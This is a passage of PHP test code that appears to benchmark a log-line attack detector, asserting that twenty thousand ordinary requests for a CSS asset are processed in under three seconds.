                lh_atk(lh_atk_get('/assets/app.4f21c9.css'));
            }
            $ms = (microtime(true) - $t0) * 1000;

            lh_true(
                $ms < 3000,
                'twenty thousand ordinary requests in under three seconds — this runs on every log '
                . 'line. Took ' . round($ms, 1) . ' ms'
            );
        },
];
